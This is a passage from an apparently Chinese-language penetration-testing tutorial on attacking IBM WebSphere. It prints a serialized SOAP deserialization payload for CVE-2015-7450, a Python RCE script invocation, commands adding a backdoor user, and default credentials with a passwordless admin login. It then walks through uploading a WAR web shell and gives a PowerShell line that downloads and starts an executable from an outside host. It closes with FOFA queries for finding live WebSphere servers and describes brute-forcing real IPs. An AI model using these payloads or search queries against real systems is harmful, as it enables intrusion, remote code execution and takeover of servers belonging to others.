GVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
    </SOAP-ENV:Header>
    <SOAP-ENV:Body>
    <ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
    <operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
    <params xsi:type="ns1:[Ljava.lang.Object;">{serObjB64}</params>
    <signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
    </ns1:invoke>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    

![1633611064_615eed38b0cf1e0d29ea4.png!small?1633611078568](https://image.3001.net/images/20211007/1633611064_615eed38b0cf1e0d29ea4.png!small?1633611078568)

这里源码出现问题更正：

    
    
    <?xml version='1.0' encoding='UTF-8'?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
    </SOAP-ENV:Header>
    <SOAP-ENV:Body>
    <ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
    <operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
    <params xsi:type="ns1:[Ljava.lang.Object;">{serObjB64}</params>
    <signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
    </ns1:invoke>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    

复制进去后，修改  
Content-Type: text/xml！

![1633611079_615eed47d68f0befccd84.png!small?1633611084405](https://image.3001.net/images/20211007/1633611079_615eed47d68f0befccd84.png!small?1633611084405)

（3）验证情况

![1633611085_615eed4d7990d99db9eda.png!small?1633611086043](https://image.3001.net/images/20211007/1633611085_615eed4d7990d99db9eda.png!small?1633611086043)成功创建dayu1用户！

    
    
    docker exec -ti sid bash
    
    docker ps
    

（4）Python脚本执行：  
![1633611090_615eed52a1c04213ace6b.png!small?1633611093007](https://image.3001.net/images/20211007/1633611090_615eed52a1c04213ace6b.png!small?1633611093007)

    
    
    python websphere_rce.py x.x.x.x:8880 'touch /tmp/success1' --proto http
    

### 2、win环境

![1633611097_615eed591cf0b7c67d2b9.png!small?1633611101609](https://image.3001.net/images/20211007/1633611097_615eed591cf0b7c67d2b9.png!small?1633611101609)

net user dayu1 QWEasd123 /add

### 3、弱口令 && 后台Getshell

在6.x至7.0版本，后台登陆只需要输入 admin作为用户标识，无需密码，即可登陆后台。

    
    
    websphere/ websphere
    system/ manager
    
    
    
    http://192.168.253.9:9060/ibm/console/logon.jsp
    https://192.168.253.9:9043/ibm/console/logon.jsp
    

#### 1）登录IBM-websphere

![1633611103_615eed5f332158203a969.png!small?1633611106013](https://image.3001.net/images/20211007/1633611103_615eed5f332158203a969.png!small?1633611106013)admin登录即可！

#### 2）新建企业应用程序

点击Applications-New Application，进入选择New Enterprise Application新建企业应用程序：  
![1633611108_615eed64233e13f4f5314.png!small?1633611111775](https://image.3001.net/images/20211007/1633611108_615eed64233e13f4f5314.png!small?1633611111775)

#### 3）War木马包上传

选择要上传的war包，下一步即可  
![1633611112_615eed68b1fd16a741072.png!small?1633611121579](https://image.3001.net/images/20211007/1633611112_615eed68b1fd16a741072.png!small?1633611121579)

#### 4）写入包名称

一直下一步到最后，选择目录为war包名称即可  
![1633611116_615eed6cb654416fe9ac2.png!small?1633611130725](https://image.3001.net/images/20211007/1633611116_615eed6cb654416fe9ac2.png!small?1633611130725)

注意：这里点击finsh稍微等待会！！

#### 5）保存到主配置

![1633611121_615eed711f77ec1464a86.png!small?1633611142369](https://image.3001.net/images/20211007/1633611121_615eed711f77ec1464a86.png!small?1633611142369)

#### 6）启动War

Application Types-WebSphere enterprise

然后选择部署好的war包后点击start启动：  
![1633611126_615eed761a6d48bfabd5f.png!small?1633611142370](https://image.3001.net/images/20211007/1633611126_615eed761a6d48bfabd5f.png!small?1633611142370)

#### 7）成功启动

![1633611131_615eed7b57575b6be585f.png!small?1633611147213](https://image.3001.net/images/20211007/1633611131_615eed7b57575b6be585f.png!small?1633611147213)

#### 8）成功getshell

shell地址：

    
    
    http://192.168.253.9:9080/dayutest/dayu.jsp
    

![1633611135_615eed7f646cd1630c944.png!small?1633611142368](https://image.3001.net/images/20211007/1633611135_615eed7f646cd1630c944.png!small?1633611142368)成功上传大马~

### 4、win环境getshell

![1633611140_615eed840ac73982e22da.png!small?1633611152399](https://image.3001.net/images/20211007/1633611140_615eed840ac73982e22da.png!small?1633611152399)

![1633611144_615eed8808127b8199937.png!small?1633611169209](https://image.3001.net/images/20211007/1633611144_615eed8808127b8199937.png!small?1633611169209)

![1633611148_615eed8c83782adb32fbb.png!small?1633611170997](https://image.3001.net/images/20211007/1633611148_615eed8c83782adb32fbb.png!small?1633611170997)

![1633611152_615eed9057f1cd948734c.png!small?1633611170999](https://image.3001.net/images/20211007/1633611152_615eed9057f1cd948734c.png!small?1633611170999)

![1633611156_615eed9487dbf2b693339.png!small?1633611171001](https://image.3001.net/images/20211007/1633611156_615eed9487dbf2b693339.png!small?1633611171001)

![1633611160_615eed98a1f92d2a82431.png!small?1633611170994](https://image.3001.net/images/20211007/1633611160_615eed98a1f92d2a82431.png!small?1633611170994)也是正常的！！

实战经验：  
![1633611165_615eed9d6c89066ca700f.png!small?1633611170996](https://image.3001.net/images/20211007/1633611165_615eed9d6c89066ca700f.png!small?1633611170996)

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://20.20.20.102/dayu103-1.exe','dayu103-1.exe');start-process dayu103-1.exe
    

## 六、实战WebSphere

### 1、实战上手SRC

https://fofa.so/

    
    
    "WebSphere" && port="8880" && country="CN"
    
    :9060/ibm/console/logon.jsp
    :9043/ibm/console/logon.jsp
    

### 2、反序列化实战拿shell

![1633654602_615f974ae25e0e6583286.png!small?1633654603246](https://image.3001.net/images/20211008/1633654602_615f974ae25e0e6583286.png!small?1633654603246)

![1633654607_615f974f43d5d1e2d38eb.png!small?1633654607509](https://image.3001.net/images/20211008/1633654607_615f974f43d5d1e2d38eb.png!small?1633654607509)

那么直接一句话反弹即可~

### 3、后台getshell

![1633654612_615f975479b86f294fead.png!small?1633654614092](https://image.3001.net/images/20211008/1633654612_615f975479b86f294fead.png!small?1633654614092)弱口令也是非常多的~

### 4、研究底层密码爆破

实战爆破~这IP是直接fofa找的！  
![1633654616_615f9758b36e4c86bda36.png!small?1633654619741](https://image.3001.net/images/20211008/1633654616_615f9758b36e4c86bda36.png!small?1633654619741)

![1633654621_615f975d40751c83ce5cf.png!small?1633654623265](https://image.3001.net/images/20211008/1633654621_615f975d40751c83ce5cf.png!small?1633654623265)经过测试，该密码无加密手段，直接爆破即可。

## 七、总结

今天学到了WebSphere简介、WebSphere详细安装、Docker详细安装WebSphere7、Java反序列化(CVE-2015-7450）、弱口令
&&
后台Getshell、实战WebSphere经验等漏洞操作，最后远程代码执行控制服务器等操作，以及整改加固建议的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）-> 服务攻防之中间件Weblogic（上）-> 服务攻防之中间件Weblogic（下）-> 服务攻防之中间件GlassFish（总）-> 服务攻防之中间件WebSphere（总）-> 服务攻防之中间件......
    

接下来在《服务攻防之框架Struts2（上）》会接触到如何进行Struts2简介、Struts2本地安装、本地S2-001复现、本地S2-057复现、Vulhub复现S2-001远程执行代码漏洞、S2-005远程执行代码漏洞、S2-007远程执行代码漏洞、S2-008远程执行代码漏洞、S2-009远程执行代码漏洞等等渗透操作，如何提权渗透等方法，请看下篇服务攻防之框架Struts2篇上章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

